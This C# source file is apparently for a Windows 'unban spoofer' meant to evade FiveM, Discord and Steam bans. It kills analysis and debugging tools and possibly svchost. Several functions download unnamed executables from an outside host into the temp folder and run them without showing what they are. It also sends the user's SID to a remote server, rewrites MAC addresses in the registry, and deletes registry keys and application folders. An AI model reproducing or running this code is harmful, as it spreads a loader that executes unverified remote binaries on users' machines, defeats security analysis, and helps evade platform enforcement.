using FakeItEasy;
using System;
using System.Data;
using System.Linq;
using System.Net;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Net.Http;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO;
using System.Globalization;
using Microsoft.Win32;
using Google.Apis.Admin.Directory.directory_v1.Data;

namespace HardwareSpoofer
{
    internal class Global
    {
        private static readonly HttpClient client = new HttpClient();
        private static int adapternum;
        private static object socket;
        public static object FiggleFonts { get; private set; }

        private static void SetConsoleFont(string fontName = "Lucida Console")
        {
            kapat();


            unsafe
            {
                var hnd = WinAPI.GetStdHandle(WinAPI.STD_OUTPUT_HANDLE);
                if (hnd != WinAPI.INVALID_HANDLE_VALUE)
                {
                    var info = new WinAPI.CONSOLE_FONT_INFO_EX();
                    info.cbSize = (uint)Marshal.SizeOf(info);
                    var newInfo = new WinAPI.CONSOLE_FONT_INFO_EX();
                    newInfo.cbSize = (uint)Marshal.SizeOf(newInfo);
                    newInfo.FontFamily = WinAPI.TMPF_TRUETYPE;
                    var ptr = new IntPtr(newInfo.FaceName);
                    Marshal.Copy(fontName.ToCharArray(), 0, ptr, fontName.Length);
                    newInfo.dwFontSize = new WinAPI.COORD(info.dwFontSize.X, info.dwFontSize.Y);
                    newInfo.FontWeight = info.FontWeight;
                    WinAPI.SetCurrentConsoleFontEx(hnd, false, ref newInfo);

                }
            }
        }


        private static async Task Main(string[] Args)
        {

            string HWID;
            string version = "0.5";

            kapat();
            HWID = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
            Console.Title = "RICH UNBAN SPOOFER V" + version;
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("                                                    YOUR HWID");
            Console.WriteLine("                             ╔═══════════════════════════════════════════════════════╗");
            Console.WriteLine("                             ║     " + HWID + "     ║");
            Console.WriteLine("                             ╚═══════════════════════════════════════════════════════╝");
            var values = new Dictionary<string, string>
            {
            { "hwid", HWID }
            };

            var content = new FormUrlEncodedContent(values);
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");

            var response = await client.PostAsync("https://www.fivemvstore.com/hwid/v0.2/hwid.php", content);
            var responseString = await response.Content.ReadAsStringAsync();
            if (responseString.Equals("OK"))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Hwid Verifed...");
                Versioncontrol();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("                                           ╔════════════════════════╗");
                Console.WriteLine("                                           ║       No Verifed       ║");
                Console.WriteLine("                                           ╚════════════════════════╝");
                Console.WriteLine();


            }
            if (Console.ReadKey(true).Key == ConsoleKey.Escape)// Basılan tuşun ESC olup olmadığını denetledik
            {
                Environment.Exit(0); // ESC'ye basılmış ise programı kapatıcak
            }
            else // ESC dışında bir tuşa basılmış ise işlemlerinizi yapıcak
            {
                // yapacağınız işlemler
                Console.ReadLine();
            }
         }
    
        private static void kapat()
        {

            string[] engellenen = { "Packer", "Dnspy", "Wireshark", "Http Sniffer", "tcpdump", "Proxy", "Fiddler", "Sniffer", "Debugger", "Http Debugger", "cheatengine", "cheatengine-x86_64", "cheatengine-x86", "cheatengine-x64" };
            string[] fivz = { "s" };
            try
            {
                Process[] programlistesi = Process.GetProcesses();
                foreach (Process process in programlistesi)
                {
                    foreach (string engelle in engellenen)
                    {
                        if (System.IO.Path.GetFileName(process.ProcessName).Contains(engelle) == true)
                        {

                            try
                            {
                                foreach (var item in fivz)
                                {
                                    if (System.IO.Path.GetFileName(process.ProcessName).Contains(item) == true)
                                    {

                                        process.Kill();

                                    }

                                    try
                                    {
                                        foreach (Process proc in Process.GetProcessesByName("Svchost"))
                                        {
                                            proc.Kill();
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                    }
                                }
                            }

                            catch (Exception)
                            {


                            }

                            MessageBox.Show("No No No");
                            process.Close();


                        }
                    }
                }
            }
            catch (Exception)
            {


            }

        }


        private static async Task Versioncontrol()
        {

            string version = "0.5";
            Console.Clear();

            HttpClient client = new HttpClient();
            var response = await client.GetAsync("https://www.fivemvstore.com/hwid/v0.2/version.html");
            var pageContents = await response.Content.ReadAsStringAsync();
            var content = await client.GetStringAsync("https://www.fivemvstore.com/hwid/v0.2/duyuru.html");

            Console.Title = "RICH UNBAN SPOOFER V" + version + " Update Checker";
            Console.ForegroundColor = ConsoleColor.Blue;

            Console.WriteLine(content);
            Console.WriteLine("                                             ╔═════════════════════════════╗");
            Console.WriteLine("                                             ║    Current Version: V" + version + "    ║");
            Console.WriteLine("                                             ║      New Version: V" + pageContents + "      ║");
            Console.WriteLine("                                             ╚═════════════════════════════╝");

            WebClient wb = new WebClient();
            string HWIDLIST = wb.DownloadString("https://www.fivemvstore.com/hwid/v0.2/version.html");
            if (HWIDLIST.Contains(version))
            {
                try
                {
                    Console.WriteLine("Update checking for 3 seconds.");
                    Thread.Sleep(1000);
                    Console.WriteLine("Update checking for 2 seconds.");
                    Thread.Sleep(1000);
                    Console.WriteLine("Update checking for 1 seconds.");
                    Thread.Sleep(1000);
                    Console.WriteLine("Up To Date...");
                    Thread.Sleep(1000);
                    selectmethod();
                }
                catch (Exception e)
                {
                    MessageBox.Show(e.ToString(), e.Message, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
        }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine();
                Console.WriteLine("                                            Not Updated Download New Version!");



            }
        }

        private static void selectmethod()
        {
            //string sex = Path.GetTempPath() + "CFXConsole.exe";
            //new WebClient().DownloadFile("https://richsiker.com/aindir/bypassers.exe", sex);
            //Process.Start(sex);
            string version = "0.5";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Clear();
            Console.Title = "RICH UNBAN SPOOFER V" + version + " Method Select Page";
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("[1] Try Classic Method");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("[2] Try Hard Method (!)");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[3] Discord // Rockstar // Steam ACC Bypass");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine("[4] Steam Account Generator");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine("[5] Xbox App Deleter");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("[6] Just Hwid And Mac Change");
            //==
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("≫ ");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("[7] HDD Spoofer");
            //==
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine();
            Console.Write("≫");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" Select Method: ");

            string a = Console.ReadLine();

            if (a == "1")
            {
                Console.Clear();
                Console.Title = "RICH UNBAN SPOOFER V" + version + " ";
                SetConsoleFont();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("                                             /$$$$$$$  /$$$$$$  /$$$$$$  /$$   /$$");
                Console.WriteLine("                                            | $$__  $$|_  $$_/ /$$__  $$| $$  | $$");
                Console.WriteLine("                                            | $$    $$  | $$  | $$   __/| $$  | $$");
                Console.WriteLine("                                            | $$$$$$$/  | $$  | $$      | $$$$$$$$");
                Console.WriteLine("                                            | $$__  $$  | $$  | $$      | $$__  $$");
                Console.WriteLine("                                            | $$    $$  | $$  | $$    $$| $$  | $$");
                Console.WriteLine("                                            | $$  | $$ /$$$$$$|  $$$$$$/| $$  | $$");
                Console.WriteLine("                                            |__/  |__/|______/  ______/ |__/  |__/");
                Console.WriteLine();
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.ResetColor();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();

                Console.WriteLine("Wait For Max 3 Seconds.");
                string fileName = Path.GetTempPath() + "wct9F5DD32.exe";
                new WebClient().DownloadFile("https://richsiker.com/aindir/Deleter.exe", fileName);
                Process.Start(fileName);

                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("Change Mac And HWID");
                Console.ResetColor();
                Console.WriteLine();
                Console.WriteLine("Determining Network Adapters...");
                Console.ResetColor();
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Generating and Changing to New MAC Address...");
                Console.ResetColor();
                Console.WriteLine();
                macchange();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine();
                Console.WriteLine("HWID Changed");
                Console.WriteLine();
                Console.WriteLine("Task Finished");
                Console.ForegroundColor = ConsoleColor.Blue;

                File.Delete(fileName);

                Console.WriteLine("Press any key to exit...");
            }

            if (a == "2")
            {
                Console.Clear();
                Console.Title = "RICH UNBAN SPOOFER V" + version + " ";
                SetConsoleFont();
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("                                             /$$$$$$$  /$$$$$$  /$$$$$$  /$$   /$$");
                Console.WriteLine("                                            | $$__  $$|_  $$_/ /$$__  $$| $$  | $$");
                Console.WriteLine("                                            | $$    $$  | $$  | $$   __/| $$  | $$");
                Console.WriteLine("                                            | $$$$$$$/  | $$  | $$      | $$$$$$$$");
                Console.WriteLine("                                            | $$__  $$  | $$  | $$      | $$__  $$");
                Console.WriteLine("                                            | $$    $$  | $$  | $$    $$| $$  | $$");
                Console.WriteLine("                                            | $$  | $$ /$$$$$$|  $$$$$$/| $$  | $$");
                Console.WriteLine("                                            |__/  |__/|______/  ______/ |__/  |__/");
                Console.WriteLine();
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.ResetColor();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();

                Console.WriteLine("Wait For Max 3 Seconds.");
                string fileName = Path.GetTempPath() + "122AJAD67.exe";
                new WebClient().DownloadFile("https://richsiker.com/aindir/hard.exe", fileName);
                Process.Start(fileName);

                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("Change Mac And HWID");
                Console.ResetColor();
                Console.WriteLine();
                Console.WriteLine("Determining Network Adapters...");
                Console.ResetColor();
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                Console.WriteLine("Generating and Changing to New MAC Address...");
                Console.ResetColor();
                Console.WriteLine();
                macchange();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine();
                Console.WriteLine("HWID Changed");
                Console.WriteLine();
                Console.WriteLine("Task Finished");
                Console.ForegroundColor = ConsoleColor.Blue;

                File.Delete(fileName);

                Console.WriteLine("Auto Restart Your Pc");
                Console.WriteLine("Press any key to exit...");

            }

            if (a == "3")
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Staring wait pls...");

                HttpClient client = new HttpClient();
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
                string fileName = Path.GetTempPath() + "412GBAD67.exe";
                new WebClient().DownloadFile("https://richsiker.com/aindir/bypass.exe", fileName);
                Thread.Sleep(1000);
                Process.Start(fileName);
                Console.WriteLine("Started.");
                Console.WriteLine();
                Console.WriteLine("[1] Menu");
                Console.WriteLine("[2] Close");
                Console.WriteLine();
                Console.Write("≫ Select Method: ");
                string c = Console.ReadLine();

                if (c == "1")
                {
                    selectmethod();
                }

                if (c == "2")
                {
                    Console.Clear();
                    Console.WriteLine("Press ESC to exit...");
                    if (Console.ReadKey(true).Key == ConsoleKey.Escape)// Basılan tuşun ESC olup olmadığını denetledik
                    {
                        Environment.Exit(0); // ESC'ye basılmış ise programı kapatıcak
                    }
                    else // ESC dışında bir tuşa basılmış ise işlemlerinizi yapıcak
                    {
                        // yapacağınız işlemler
                        Console.ReadLine();
                    }
                }
            }

            if (a == "4")
            {
                Console.Clear();
                Process.Start("https://accgen.cathook.club/");
                Console.WriteLine("[1] Menu");
                Console.WriteLine("[2] Close");
                Console.WriteLine();
                Console.Write("≫ Select Method: ");
                string b = Console.ReadLine();

                if (b == "1")
                {
                    selectmethod();
                }

                if (b == "2")
                {
                    Console.Clear();
                    Console.WriteLine("Press ESC to exit...");
                    if (Console.ReadKey(true).Key == ConsoleKey.Escape)// Basılan tuşun ESC olup olmadığını denetledik
                    {
                        Environment.Exit(0); // ESC'ye basılmış ise programı kapatıcak
                    }
                    else // ESC dışında bir tuşa basılmış ise işlemlerinizi yapıcak
                    {
                        // yapacağınız işlemler
                        Console.ReadLine();
                    }
                }
            }
            if (a == "5")
            {
                Console.Clear();
                string fileName = Path.GetTempPath() + "7FBSA431.exe";
                new WebClient().DownloadFile("https://richsiker.com/aindir/xbox.exe", fileName);
                Process.Start(fileName);
                Console.WriteLine("Xbox Deleter Opens.");
                Thread.Sleep(6000);
                Console.WriteLine();
                Console.WriteLine();
                Console.WriteLine("Xbox Fucked... See you baby. ;)");
                Console.WriteLine();
                Console.WriteLine("[1] Menu");
                Console.WriteLine("[2] Close");
                Console.WriteLine();
                Console.Write("≫ Select Method: ");
                string h = Console.ReadLine();

                if (h == "1")
                {
                    selectmethod();
                }

                if (h == "2")
                {
                    Console.Clear();
                    Console.WriteLine("Press ESC to exit...");
                    if (Console.ReadKey(true).Key == ConsoleKey.Escape)// Basılan tuşun ESC olup olmadığını denetledik
                    {
                        Environment.Exit(0); // ESC'ye basılmış ise programı kapatıcak
                    }
                    else // ESC dışında bir tuşa basılmış ise işlemlerinizi yapıcak
                    {
                        // yapacağınız işlemler
                        Console.ReadLine();
                    }
                }
            }

            if (a == "6")
            {
                Console.Clear();
                Console.WriteLine();
                Console.WriteLine("Hwid Change Wait Pls...");
                Console.WriteLine();
                Thread.Sleep(1000);
                hwidchange();
                Console.WriteLine();
                Thread.Sleep(1000);
                Console.Clear();
                Console.WriteLine();
                Console.WriteLine("HWID Changed... See you baby. ;)");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine();
                Console.WriteLine("[1] Close");
                Console.WriteLine();
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("≫ Select Method: ");
                string N = Console.ReadLine();

                if (N == "1")
                {
                }
            }

            if (a == "7")
            {
                string fileName = Path.GetTempPath() + "4FBMLU37.exe";
                new WebClient().DownloadFile("https://richsiker.com/aindir/hdd.exe", fileName);
                Process.Start(fileName);
                Console.Clear();
                Console.WriteLine("HDD CHANGER STARTED");
                selectmethod();
            }
        }




         static void sikfivsem()
        {
            string fileName = Path.GetTempPath() + "8GHH2167.exe";
            new WebClient().DownloadFile("https://richsiker.com/aindir/discord-deleter.exe", fileName);
            Process.Start(fileName);

            string fileNamSe = Path.GetTempPath() + "6KGSH1531.exe";
            new WebClient().DownloadFile("https://richsiker.com/aindir/xbox.exe", fileNamSe);
            Process.Start(fileNamSe);

            string yarrak = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
            // USER SID
            Registry.Users.DeleteSubKeyTree(yarrak + "\\SOFTWARE\\Chromium", false);
            Registry.Users.DeleteSubKeyTree(yarrak + "\\SOFTWARE\\CitizenFX", false);
            Registry.Users.DeleteSubKeyTree(yarrak + "\\SOFTWARE\\FiveM", false);
            Registry.Users.DeleteSubKeyTree(yarrak + "\\SOFTWARE\\discord-", false);

            // USER CLASSES
            Registry.Users.DeleteSubKeyTree(yarrak + "_Classes\\FiveM.ProtocolHandler", false);
            Registry.Users.DeleteSubKeyTree(yarrak + "_Classes\\fivem", false);
            Registry.Users.DeleteSubKeyTree(yarrak + "_Classes\\discord-", false);

            // CURRENT USER
            Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\CitizenFX", false);
            Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\FiveM", false);
            Registry.CurrentUser.DeleteSubKeyTree("\\SOFTWARE\\Chromium", false);

            // Classes ROOT
            Registry.ClassesRoot.DeleteSubKeyTree("fivem", false);
            Registry.ClassesRoot.DeleteSubKeyTree("FiveM.ProtocolHandler", false);
            Registry.ClassesRoot.DeleteSubKeyTree("discord-", false);

            // Local Machine

            //Registry.LocalMachine.DeleteSubKeyTree("fivem", false);

        }


        private static void sikfivem()
        {

            string fileNamea = Path.GetTempPath() + "41GHHF15.exe";
            new WebClient().DownloadFile("https://richsiker.com/aindir/unban.exe", fileNamea);
            Process.Start(fileNamea);

            var folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DigitalEntitlements";
            if (Directory.Exists(folder))
                Directory.Delete(folder, true);

            var folder1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\cache";
            if (Directory.Exists(folder1))
                Directory.Delete(folder1, true);

            var folder2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\CitizenFX";
            if (Directory.Exists(folder2))
                Directory.Delete(folder2, true);

            var folder3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\mods";
            if (Directory.Exists(folder3))
                Directory.Delete(folder3, true);

            var folder4 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\imgui.inie";
            if (File.Exists(folder4))
                File.Delete(folder4);

            var folder5 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\CitizenFX.ini";
            if (File.Exists(folder5))
                File.Delete(folder5);

            var folder6 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\asi-five.dll";
            if (File.Exists(folder6))
                File.Delete(folder6);

            var folder31 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\adhesive.dll";
            if (File.Exists(folder31))
                File.Delete(folder31);

            var folder32 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\crashes";
            if (Directory.Exists(folder32))
                Directory.Delete(folder32, true);

            var folder33 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\logs";
            if (Directory.Exists(folder33))
                Directory.Delete(folder33, true);


            var folder7 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\FiveM\\FiveM.app\\caches.xml";
            if (File.Exists(folder7))
                File.Delete(folder7);
            Thread.Sleep(5000);

            Console.WriteLine("Deleted Wait Pls...");
            sikfivsem();
            Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine();
            Console.WriteLine("Fucked TEMP Bla Bla... See you baby. ;)");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Fivem File Deleted...");
            Console.WriteLine();
        }
        private static void macchange()
        {


            string fileNameA = Path.GetTempPath() + "43DBMLU37.exe";
            new WebClient().DownloadFile("https://richsiker.com/aindir/masterl.exe", fileNameA);

            string fileNameAA = Path.GetTempPath() + "83DFMDX99.exe";
            new WebClient().DownloadFile("https://richsiker.com/aindir/masdownload.exe", fileNameAA);
            Process.Start(fileNameAA);


            var netBox = new ComboBox();
            foreach (var adapter in NetworkInterface.GetAllNetworkInterfaces().Where(
                a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)
            ).OrderByDescending(a => a.Speed))
            {
                adapternum++;
                Console.WriteLine(new Adapter(adapter));
                netBox.Items.Add(new Adapter(adapter));
            }

            for (var i = 0; i < adapternum; i++)
            {
                netBox.SelectedIndex = i;
                var netBoxSelectedItem = netBox.SelectedItem as Adapter;
                Console.ForegroundColor = ConsoleColor.Red;
                var ss = Adapter.GetNewMac();
                if (netBoxSelectedItem.SetRegistryMac(ss))
                    Console.WriteLine("[Network " + (i + 1) + " Changed] " + ss);

                else

                    Console.WriteLine("[Network " + (i + 1) + " Not Changed] " + netBoxSelectedItem.Mac);
                Console.WriteLine();
                Console.WriteLine();
            }
            Console.WriteLine("PLS WAIT!!!");
            Thread.Sleep(15000);
            sikfivem();

            //string strCmdText;
            //strCmdText = "Del /S /F /Q %temp%";
            //System.Diagnostics.Process.Start("CMD.exe", strCmdText);

            //string strCmdaText;
            //strCmdaText = "Del /S /F /Q %Windir%\\Temp";
            //System.Diagnostics.Process.Start("CMD.exe", strCmdaText);
            //foreach (Process proc in Process.GetProcessesByName("CMD.exe"))
            //{

            //    proc.Kill();

            //}

        }

        private static void hwidchange()
        {
            var netBox = new ComboBox();
            foreach (var adapter in NetworkInterface.GetAllNetworkInterfaces().Where(
                a => Adapter.IsValidMac(a.GetPhysicalAddress().GetAddressBytes(), true)
            ).OrderByDescending(a => a.Speed))
            {
                adapternum++;
                Console.WriteLine(new Adapter(adapter));
                netBox.Items.Add(new Adapter(adapter));
            }

            for (var i = 0; i < adapternum; i++)
            {
                netBox.SelectedIndex = i;
                var netBoxSelectedItem = netBox.SelectedItem as Adapter;
                Console.ForegroundColor = ConsoleColor.Red;
                var ss = Adapter.GetNewMac();
                if (netBoxSelectedItem.SetRegistryMac(ss))
                    Console.WriteLine("[Network " + (i + 1) + " Changed] " + ss);

                else

                    Console.WriteLine("[Network " + (i + 1) + " Not Changed] " + netBoxSelectedItem.Mac);

                Thread.Sleep(217);
            }
        }
    }
}